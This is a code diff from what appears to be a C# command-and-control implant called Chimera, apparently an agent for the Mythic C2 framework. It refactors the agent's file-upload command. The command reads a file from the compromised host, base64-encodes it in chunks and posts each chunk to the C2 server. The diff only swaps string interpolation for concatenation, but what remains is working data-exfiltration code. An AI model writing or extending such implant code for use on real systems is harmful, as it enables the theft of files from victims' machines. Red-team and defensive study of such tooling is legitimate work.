@@ -14,7 +14,7 @@ namespace Chimera.Commands
             try
             {
                 if (!File.Exists(remotePath))
-                    return $"[error] File not found: {remotePath}";
+                    return "[error] File not found: " + remotePath;
 
                 byte[] fileBytes = File.ReadAllBytes(remotePath);
                 int totalChunks = (int)Math.Ceiling((double)fileBytes.Length / CHUNK_SIZE);
@@ -28,40 +28,34 @@ namespace Chimera.Commands
                     Buffer.BlockCopy(fileBytes, offset, chunk, 0, chunkSize);
 
                     string chunkB64 = Convert.ToBase64String(chunk);
+                    string escapedPath = remotePath.Replace("\\", "\\\\");
 
-                    // First chunk — tell Mythic we're starting an upload
                     string json;
                     if (i == 0)
                     {
-                        json = $@"{{
-                            ""action"": ""post_response"",
-                            ""uuid"": ""{callbackUUID}"",
-                            ""responses"": [{{
-                                ""task_id"": ""{taskID}"",
-                                ""upload"": {{
-                                    ""chunk_num"": {i + 1},
-                                    ""total_chunks"": {totalChunks},
-                                    ""chunk_data"": ""{chunkB64}"",
-                                    ""full_path"": ""{remotePath.Replace("\\", "\\\\")}""
-                                }}
-                            }}]
-                        }}";
+                        json = "{\"action\":\"post_response\","
+                             + "\"uuid\":\"" + callbackUUID + "\","
+                             + "\"responses\":[{"
+                             + "\"task_id\":\"" + taskID + "\","
+                             + "\"upload\":{"
+                             + "\"chunk_num\":" + (i + 1) + ","
+                             + "\"total_chunks\":" + totalChunks + ","
+                             + "\"chunk_data\":\"" + chunkB64 + "\","
+                             + "\"full_path\":\"" + escapedPath + "\""
+                             + "}}]}";
                     }
                     else
                     {
-                        json = $@"{{
-                            ""action"": ""post_response"",
-                            ""uuid"": ""{callbackUUID}"",
-                            ""responses"": [{{
-                                ""task_id"": ""{taskID}"",
-                                ""upload"": {{
-                                    ""chunk_num"": {i + 1},
-                                    ""total_chunks"": {totalChunks},
-                                    ""chunk_data"": ""{chunkB64}"",
-                                    ""file_id"": ""{fileID}""
-                                }}
-                            }}]
-                        }}";
+                        json = "{\"action\":\"post_response\","
+                             + "\"uuid\":\"" + callbackUUID + "\","
+                             + "\"responses\":[{"
+                             + "\"task_id\":\"" + taskID + "\","
+                             + "\"upload\":{"
+                             + "\"chunk_num\":" + (i + 1) + ","
+                             + "\"total_chunks\":" + totalChunks + ","
+                             + "\"chunk_data\":\"" + chunkB64 + "\","
+                             + "\"file_id\":\"" + fileID + "\""
+                             + "}}]}";
                     }
 
                     string response = C2Http.Send(json);
@@ -71,11 +65,11 @@ namespace Chimera.Commands
                         fileID = Tasking.ExtractJsonValue(response, "file_id");
                 }
 
-                return $"[+] Uploaded {remotePath} ({fileBytes.Length} bytes, {totalChunks} chunks)";
+                return "[+] Uploaded " + remotePath + " (" + fileBytes.Length + " bytes, " + totalChunks + " chunks)";
             }
             catch (Exception ex)
             {
-                return $"[error] {ex.Message}";
+                return "[error] " + ex.Message;
             }
         }
     }
